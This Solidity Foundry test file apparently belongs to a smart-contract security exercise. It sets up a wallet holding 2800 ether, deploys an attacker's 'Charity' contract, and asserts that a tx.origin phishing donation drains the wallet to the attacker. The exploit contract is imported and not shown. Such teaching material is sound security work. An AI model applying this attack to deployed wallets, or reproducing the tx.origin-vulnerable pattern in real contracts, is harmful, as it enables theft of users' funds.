//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/tx-origin-phishing-1/SimpleSmartWallet.sol";
import "../../src/tx-origin-phishing-1/Charity.sol";

/**
@dev run "forge test --match-contract PH1" 
*/
contract TestPH1 is Test {
    SimpleSmartWallet wallet;
    Charity attackerContract;

    uint256 public constant HEDGE_FUND_DEPOSIT = 2800 ether;
    uint256 public constant CHARITY_DONATION = 0.1 ether;

    address fundManager;
    address attacker;

    uint256 attackerBalance;
    uint256 deployerBalance;

    function setUp() public {
        fundManager = address(1);
        attacker = address(2);

        vm.deal(fundManager, 10000 ether);

        vm.prank(fundManager);
        wallet = new SimpleSmartWallet{value: HEDGE_FUND_DEPOSIT}();

        uint smartWalletBalance = address(wallet).balance;
        assertEq(smartWalletBalance, HEDGE_FUND_DEPOSIT);
    }

    function test() public {
        console.log("[*] Exploiting...");

        vm.prank(attacker);
        attackerContract = new Charity(address(wallet), attacker);

        /** SUCCESS CONDITIONS */
        // Fund manager is tricked to send a donation to the "charity" (attacker's contract)
        vm.startPrank(fundManager, fundManager); //startPrank(msg.sender, tx.origin)
        (bool success, ) = address(attackerContract).call{value: CHARITY_DONATION}("");
        require(success, "Transfer Failed to charity");
        vm.stopPrank();
        // Smart wallet supposed to be emptied
        assertEq(address(wallet).balance, 0);
        // Attacker supposed to own the stolen ETH
        assertEq(address(attacker).balance, HEDGE_FUND_DEPOSIT);

        console.log("[+] Exploit Successful");
    }
}
